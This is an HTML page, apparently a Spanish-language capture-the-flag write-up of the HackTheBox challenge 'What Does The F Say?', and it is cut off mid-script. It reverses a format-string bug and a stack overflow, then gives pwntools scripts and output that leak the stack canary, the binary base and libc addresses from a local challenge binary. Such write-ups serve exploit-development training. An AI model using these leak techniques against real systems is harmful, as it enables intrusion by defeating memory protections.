@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox What Does The F Say?</title>
+
+  <meta name="description" content="Resolución del reto What Does The F Say? de la plataforma de HackTheBox">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox What Does The F Say?">
+  <meta name="twitter:description" content="Resolución del reto What Does The F Say? de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/hackthebox/challenges.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox What Does The F Say?">
+  <meta property="og:description" content="Resolución del reto What Does The F Say? de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/hackthebox/challenges.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/hackthebox/challenges.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox What Does The F Say?" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/challenges" title="xchg2pwn" class="blog-button">Challenges</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>              
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#reversing">Reversing</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/hackthebox/challenges.png" style="float: right; margin-right:0px; margin-left:0px; height:70px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">What Does The F Say?</h2><br>
+  </header>
+  
+<section class="post" id="reversing">
+<br><h3 class="post-title">Reversing</h3><br>
+
+<p class="plain-text">Al ejecutar el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/HackTheBox/WhatDoesTheFSay/what_does_the_f_say.zip">binario</a> muestra un contador de rocas y 2 menus para comidas y bebidas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./what_does_the_f_say</span><span class="p">
+
+Welcome to Fox space bar!
+
+Current space rocks: 69.69  
+
+1. Space drinks
+2. Space food</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos por desensamblar la función <code class="language-plaintext highlighter-rouge">main</code>, ésta es relativamente simple, solo llama a la función <code class="language-plaintext highlighter-rouge">setup</code> para el output, posteriormente a las funciones <code class="language-plaintext highlighter-rouge">welcome</code> y <code class="language-plaintext highlighter-rouge">fox_bar</code></p>
+<a href="/challenges/whatdoesthefsay/1.png" target="_blank"><div><p><img src="/challenges/whatdoesthefsay/1.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">welcome</code> simplemente muestra un mensaje con <code class="language-plaintext highlighter-rouge">puts</code> y sigue la ejecución</p>
+<a href="/challenges/whatdoesthefsay/2.png" target="_blank"><div><p><img src="/challenges/whatdoesthefsay/2.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">fox_bar</code> inicia mostrando un <code class="language-plaintext highlighter-rouge">menu</code> y recibiendo un digito con <code class="language-plaintext highlighter-rouge">scanf</code> que se utilizará como opción en una estructura <code class="language-plaintext highlighter-rouge">switch</code> para elegir a que bloque saltar</p>
+<a href="/challenges/whatdoesthefsay/3.png" target="_blank"><div><p><img src="/challenges/whatdoesthefsay/3.png"></p></div></a>
+
+<p class="plain-text">Al final del bloque anterior se compara la variable <code class="language-plaintext highlighter-rouge">option</code> con <code class="language-plaintext highlighter-rouge">1</code>, si el valor es <code class="language-plaintext highlighter-rouge">1</code> llama a la función <code class="language-plaintext highlighter-rouge">drinks_menu</code>, si es igual a <code class="language-plaintext highlighter-rouge">2</code> llama a la función <code class="language-plaintext highlighter-rouge">food_menu</code></p>
+<a href="/challenges/whatdoesthefsay/4.png" target="_blank"><div><p><img src="/challenges/whatdoesthefsay/4.png"></p></div></a>
+
+<p class="plain-text">Iniciamos con la función <code class="language-plaintext highlighter-rouge">drink_menu</code>, utiliza <code class="language-plaintext highlighter-rouge">memset</code> para rellenar con <code class="language-plaintext highlighter-rouge">0's</code> un total de <code class="language-plaintext highlighter-rouge">0x1e</code> bytes de un buffer, luego muestra otro menú con <code class="language-plaintext highlighter-rouge">puts</code> y recibe un digito de opción con <code class="language-plaintext highlighter-rouge">scanf</code>, al final del bloque compara la opción con un <code class="language-plaintext highlighter-rouge">1</code> y realiza un salto</p>
+<a href="/challenges/whatdoesthefsay/5.png" target="_blank"><div><p><img src="/challenges/whatdoesthefsay/5.png"></p></div></a>
+
+<p class="plain-text">Si la opción es <code class="language-plaintext highlighter-rouge">1</code> disminuye la variable local srocks <code class="language-plaintext highlighter-rouge">4.9</code> unidades, llama a una función y compara si es menor que <code class="language-plaintext highlighter-rouge">20</code>, si es asi muestra un mensaje con <code class="language-plaintext highlighter-rouge">puts</code></p>
+<a href="/challenges/whatdoesthefsay/6.png" target="_blank"><div><p><img src="/challenges/whatdoesthefsay/6.png"></p></div></a>
+
+<p class="plain-text">Si la opción es igual a <code class="language-plaintext highlighter-rouge">2</code> muestra una pregunta con <code class="language-plaintext highlighter-rouge">puts</code> y recibe un buffer de <code class="language-plaintext highlighter-rouge">0x1d</code> bytes con <code class="language-plaintext highlighter-rouge">read</code>, luego ese mismo buffer lo muestra con <code class="language-plaintext highlighter-rouge">printf</code> sin ningun formato causando una vulnerabilidad de format string, después llama a la función <code class="language-plaintext highlighter-rouge">warning</code></p>
+<a href="/challenges/whatdoesthefsay/7.png" target="_blank"><div><p><img src="/challenges/whatdoesthefsay/7.png"></p></div></a>
+<a href="/challenges/whatdoesthefsay/8.png" target="_blank"><div><p><img src="/challenges/whatdoesthefsay/8.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">warning</code> compara si la variable global <code class="language-plaintext highlighter-rouge">srocks</code> es mayor que <code class="language-plaintext highlighter-rouge">20.0</code>, si es mayor sigue la linea verde, si es menor o igual simplemente sigue la linea roja</p>
+<a href="/challenges/whatdoesthefsay/9.png" target="_blank"><div><p><img src="/challenges/whatdoesthefsay/9.png"></p></div></a>
+
+<p class="plain-text">Cuando la variable <code class="language-plaintext highlighter-rouge">srocks</code> es menor o igual a <code class="language-plaintext highlighter-rouge">20.0</code> muestra un mensaje y recibe una string con <code class="language-plaintext highlighter-rouge">scanf</code> que guarda en <code class="language-plaintext highlighter-rouge">rbp - 32</code>, esto puede ocasionar un buffer overflow</p>
+<a href="/challenges/whatdoesthefsay/10.png" target="_blank"><div><p><img src="/challenges/whatdoesthefsay/10.png"></p></div></a>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, empezamos con el <code class="language-plaintext highlighter-rouge">FULL RELRO</code> nos impode escribir en la tabla <code class="language-plaintext highlighter-rouge">got</code>, el <code class="language-plaintext highlighter-rouge">Canary</code> establece una variable local en <code class="language-plaintext highlighter-rouge">rbp - 8</code> que comprueba que no se haya modificado antes de retornar, el <code class="language-plaintext highlighter-rouge">NX</code> nos impide ejecutar shellcode en el stack y el <code class="language-plaintext highlighter-rouge">PIE</code> hace aleatoria la dirección base del binario</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec</span><span class="p"> what_does_the_f_say
+[</span><span class="az">*</span><span class="p">] '/home/user/what_does_the_f_say'  
+    Arch:       amd64-64-little
+    RELRO:      </span><span class="ve">Full RELRO</span><span class="p">
+    Stack:      </span><span class="ve">Canary found</span><span class="p">
+    NX:         </span><span class="ve">NX enabled</span><span class="p">
+    PIE:        </span><span class="ve">PIE enabled</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sabemos que luego de la pregunta existe un format string, si enviamos varios <code class="language-plaintext highlighter-rouge">%p</code> logramos hacer leaks de diferentes puntero interesante separados por un <code class="language-plaintext highlighter-rouge">.</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">1. Space drinks
+2. Space food
+1
+
+1. Milky way (4.90 s.rocks)
+2. Kryptonite vodka (6.90 s.rocks)
+3. Deathstar(70.00 s.rocks)
+2
+
+Red or Green Kryptonite?
+%p.%p.%p.%p.%p.%p.%p.%p.%p
+0x7ffc11d66430.0x1d.0x7990fc910191.0x19.(nil).0x2f2f2f2f2f2f2f2f.0x200000000.0x70252e70252e7025.0x252e70252e70252e  
+
+Enjoy your Kryptonite vodka!
+
+Current space rocks: 62.79
+
+1. Space drinks
+2. Space food</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El siguiente script en python itera sobre las posiciones del <code class="language-plaintext highlighter-rouge">1</code> al <code class="language-plaintext highlighter-rouge">9</code> que es la cantidad máxima debido a que tenemos la limitación de <code class="language-plaintext highlighter-rouge">srocks</code>, de esta forma podemos ver algunos punteros filtrados sin embargo ninguno de ellos nos es de verdadero interés</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, log
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./what_does_the_f_say"</span><span class="p">)
+
+</span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi"> 10</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"Space food</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"(70.00 s.rocks)</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"Kryptonite?</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> f</span><span class="s">"%</span><span class="p">{i}</span><span class="s">$p"</span><span class="p">.encode())  
+
+    leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().decode()
+
+    log.info(</span><span class="no">f</span><span class="s">"</span><span class="p">{i}</span><span class="s">:</span><span class="p"> {leak}</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './what_does_the_f_say': pid 225635
+[</span><span class="az">*</span><span class="p">] 1: 0x7ffe1d404be0
+[</span><span class="az">*</span><span class="p">] 2: 0x1d
+[</span><span class="az">*</span><span class="p">] 3: 0x7f685a910191
+[</span><span class="az">*</span><span class="p">] 4: 0x19
+[</span><span class="az">*</span><span class="p">] 5: (nil)
+[</span><span class="az">*</span><span class="p">] 6: 0x2f2f2f2f2f2f2f2f
+[</span><span class="az">*</span><span class="p">] 7: 0x200000000
+[</span><span class="az">*</span><span class="p">] 8: 0xa70243825
+[</span><span class="az">*</span><span class="p">] 9: (nil)
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+
+You have less than 20 space rocks! Are you sure you want to buy it?  
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si miramos los punteros en las posiciones <code class="language-plaintext highlighter-rouge">10</code> al <code class="language-plaintext highlighter-rouge">18</code> encontramos otros punteros, la posición <code class="language-plaintext highlighter-rouge">13</code> pertenece a la stack cookie ya que sigue el formato normal terminando el qword en <code class="language-plaintext highlighter-rouge">00</code>, la posición <code class="language-plaintext highlighter-rouge">15</code> pertenece a la función <code class="language-plaintext highlighter-rouge">fox_bar</code>, parte del binario</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, log
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./what_does_the_f_say"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+</span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mi"> 19</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"Space food</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"(70.00 s.rocks)</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"Kryptonite?</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> f</span><span class="s">"%</span><span class="p">{i}</span><span class="s">$p"</span><span class="p">.encode())  
+
+    leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().decode()
+
+    log.info(</span><span class="no">f</span><span class="s">"</span><span class="p">{i}</span><span class="s">: </span><span class="p">{leak}</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 226791
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './what_does_the_f_say']  
+[</span><span class="az">*</span><span class="p">] 10: (nil)
+[</span><span class="az">*</span><span class="p">] 11: (nil)
+[</span><span class="az">*</span><span class="p">] 12: (nil)
+[</span><span class="az">*</span><span class="p">] 13: 0x2725fd5658801000
+[</span><span class="az">*</span><span class="p">] 14: 0x7ffe0b1bbca0
+[</span><span class="az">*</span><span class="p">] 15: 0x60475e91274a
+[</span><span class="az">*</span><span class="p">] 16: 0x1000000c2
+[</span><span class="az">*</span><span class="p">] 17: 0x2725fd5658801000
+[</span><span class="az">*</span><span class="p">] 18: 0x7ffe0b1bbcd0
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+
+You have less than 20 space rocks! Are you sure you want to buy it?
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La posición <code class="language-plaintext highlighter-rouge">15</code> apunta a la función <code class="language-plaintext highlighter-rouge">fox_bar</code>, esta dirección es parte del binario y si restamos el offset de <code class="language-plaintext highlighter-rouge">0x174a</code> bytes deberiamos poder obtener la dirección base</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">^C
+Program received signal SIGINT, Interrupt.
+</span><span class="az">0x00007e3b83b10191 </span><span class="p">in</span><span class="am"> read</span><span class="p"> () from</span><span class="ve"> ./libc.so.6
+</span><span class="ro">pwndbg></span><span class="p"> x/i 0x60475e91274a
+   </span><span class="az">0x60475e91274a</span><span class="p"> &lt</span><span class="am">fox_bar</span><span class="p">+106>:</span><span class="ve">        jmp</span><span class="az">    0x60475e912764</span><span class="p"> &lt</span><span class="am">fox_bar</span><span class="p">+132>
+</span><span class="ro">pwndbg></span><span class="p"> vmmap what_does_the_f_say
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+►   0x60475e911000     0x60475e912000 r--p     1000      0 /home/user/what_does_the_f_say
+</span><span class="ro">►   0x60475e912000     0x60475e913000 r-xp     1000   1000 /home/user/what_does_the_f_say
+</span><span class="p">►   0x60475e913000     0x60475e914000 r--p     1000   2000 /home/user/what_does_the_f_say
+►   0x60475e914000     0x60475e915000 r--p     1000   2000 /home/user/what_does_the_f_say
+</span><span class="sa">►   0x60475e915000     0x60475e916000 rw-p     1000   3000 /home/user/what_does_the_f_say  
+►   0x60475e916000     0x60475e918000 rw-p     2000   5000 /home/user/what_does_the_f_say  
+</span><span class="ro">    0x7e3b83a00000     0x7e3b83be7000 r-xp   1e7000      0 /home/user/libc.so.6
+</span><span class="ro">pwndbg></span><span class="p"> p/x 0x60475e91274a - 0x60475e911000
+</span><span class="az">$1</span><span class="p"> = 0x174a
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, hacemos un leak con los punteros en la posición <code class="language-plaintext highlighter-rouge">13</code> y <code class="language-plaintext highlighter-rouge">15</code>, a éste último le restamos el offset y de esta forma obtenemos la stack cookie y la dirección base del binario, con esto ya evadimos 2 de las protecciones que son el <code class="language-plaintext highlighter-rouge">Canary</code> y el <code class="language-plaintext highlighter-rouge">PIE</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, log
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./what_does_the_f_say"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)  
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Space food</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"(70.00 s.rocks)</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Kryptonite?</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"%13$p.%15$p"</span><span class="p">)
+
+leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().split(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
+canary</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x174a</span><span class="p">
+
+log.info(</span><span class="no">f</span><span class="s">"Canary: </span><span class="p">{</span><span class="no">hex</span><span class="p">(canary)}</span><span class="s">"</span><span class="p">)
+log.info(</span><span class="no">f</span><span class="s">"Binary base:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(binary_base)}</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo ejecutamos para comprobar que funciona, esto nos muestra la stack cookie y una dirección que si comparamos con la dirección base del binario es justo la misma</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 228144
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './what_does_the_f_say']  
+[</span><span class="az">*</span><span class="p">] Canary: 0xc71c366111d4ba00
+[</span><span class="az">*</span><span class="p">] Binary base: 0x57935ae9c000
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+
+Enjoy your Kryptonite vodka!
+
+Current space rocks: 62.79
+
+1. Space drinks
+2. Space food
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">^C
+Program received signal SIGINT, Interrupt.
+</span><span class="az">0x00007c9ddb910191 </span><span class="p">in</span><span class="am"> read</span><span class="p"> () from</span><span class="ve"> ./libc.so.6
+</span><span class="ro">pwndbg></span><span class="p"> vmmap what_does_the_f_say
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+►   0x57935ae9c000     0x57935ae9d000 r--p     1000      0 /home/user/what_does_the_f_say
+</span><span class="ro">►   0x57935ae9d000     0x57935ae9e000 r-xp     1000   1000 /home/user/what_does_the_f_say
+</span><span class="p">►   0x57935ae9e000     0x57935ae9f000 r--p     1000   2000 /home/user/what_does_the_f_say
+►   0x57935ae9f000     0x57935aea0000 r--p     1000   2000 /home/user/what_does_the_f_say
+</span><span class="sa">►   0x57935aea0000     0x57935aea1000 rw-p     1000   3000 /home/user/what_does_the_f_say  
+►   0x57935aea1000     0x57935aea3000 rw-p     2000   5000 /home/user/what_does_the_f_say  
+</span><span class="ro">    0x7c9ddb800000     0x7c9ddb9e7000 r-xp   1e7000      0 /home/user/libc.so.6
+pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al inicio cuando lekeamos algunos punteros podemos notar que a partir de la posición <code class="language-plaintext highlighter-rouge">8</code> los valores son un reflejo de nuestros datos en punteros hexadecimales</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ unhex</span><span class="p"> 70252e70252e7025 | </span><span class="ve">rev</span><span class="p">  
+%p.%p.%p
+
+</span><span class="ve">❯ unhex</span><span class="p"> 252e70252e70252e | </span><span class="ve">rev</span><span class="p">  
+%.p%.p%.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, podemos enviar <code class="language-plaintext highlighter-rouge">%9$p</code> para hacer un leak de la posición <code class="language-plaintext highlighter-rouge">9</code> y luego rellenar con <code class="language-plaintext highlighter-rouge">.</code> a <code class="language-plaintext highlighter-rouge">8</code> bytes que es el tamaño del puntero, luego enviamos <code class="language-plaintext highlighter-rouge">AAAABBBB</code>, el resultado es que el leak muestra estos caractéres de la posición <code class="language-plaintext highlighter-rouge">9</code> como puntero</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">1. Space drinks
+2. Space food
+1
+
+1. Milky way (4.90 s.rocks)
+2. Kryptonite vodka (6.90 s.rocks)  
+3. Deathstar(70.00 s.rocks)
+2
+
+Red or Green Kryptonite?
+%9$p....AAAABBBB
+0x4242424241414141....AAAABBBB
+
+Enjoy your Kryptonite vodka!
+
+Current space rocks: 62.79
+
+1. Space drinks
+2. Space food</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos aprovechar esto para hacer un leak de libc, para ello solo necesitamos la entrada <code class="language-plaintext highlighter-rouge">got</code> de la función <code class="language-plaintext highlighter-rouge">puts</code> que contiene una referencia a su posición en libc</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/i puts
+   </span><span class="az">0x1030</span><span class="p"> &lt</span><span class="am">puts@plt</span><span class="p">>:   </span><span class="ve">jmp</span><span class="p">    QWORD PTR [</span><span class="ro">rip</span><span class="p">+</span><span class="az">0x2f5a</span><span class="p">]</span><span class="c1">        # 0x3f90 &ltputs@got.plt>  </span><span class="p">
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">También necesitamos el offset ésta la misma función pero en libc que obtenemos con <code class="language-plaintext highlighter-rouge">libcdb</code>, esto para restarle esa cantidad al leak y obtener la dirección base de libc</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ libcdb</span><span class="p"> file libc.so.6
+[</span><span class="az">*</span><span class="p">]</span><span class="ro"> libc.so.6</span><span class="p">
+    </span><span class="ve">Version:</span><span class="p">     2.27
+    </span><span class="ve">BuildID:</span><span class="p">     d3cf764b2f97ac3efe366ddd07ad902fb6928fd7
+    </span><span class="ve">MD5:</span><span class="p">         35ef4ffc9c6ad7ffd1fd8c16f14dc766
+    </span><span class="ve">SHA1:</span><span class="p">        a22321cd65f28f70cf321614fdfd22f36ecd0afe
+    </span><span class="ve">SHA256:</span><span class="p">      f0ad9639b2530741046e06c96270b25da2339b6c15a7ae46de8fb021b3c4f529  
+    </span><span class="ve">Symbols:</span><span class="p">
+        __libc_start_main_ret = 0x21b97
+                         dup2 = 0x110ab0
+                       printf = 0x64f00
+                         puts = 0x80a30
+                         read = 0x110180
+                   str_bin_sh = 0x1b40fa
+                       system = 0x4f4e0
+                        write = 0x110250</span>
+</code></pre></div></div><br>
+
+
+<p class="plain-text">Ahora nuestro exploit usa el formato <code class="language-plaintext highlighter-rouge">%9$s</code> para mostrar como string el contenido de la posición <code class="language-plaintext highlighter-rouge">9</code>, rellenamos el qword y para esa posición le pasamos la entrada <code class="language-plaintext highlighter-rouge">got</code> de la función <code class="language-plaintext highlighter-rouge">puts</code>, entonces ejecutará algún tipo de <code class="language-plaintext highlighter-rouge">printf(puts@got)</code> que muestra la dirección de <code class="language-plaintext highlighter-rouge">puts</code> en memoria y al restar el offset nos da la dirección base de libc</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn</span><span class="o"> import</span><span class="p"> gdb, p64, u64, log
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./what_does_the_f_say"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Space food</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"(70.00 s.rocks)</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Kryptonite?</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"%13$p.%15$p"</span><span class="p">)
+
+leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().split(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
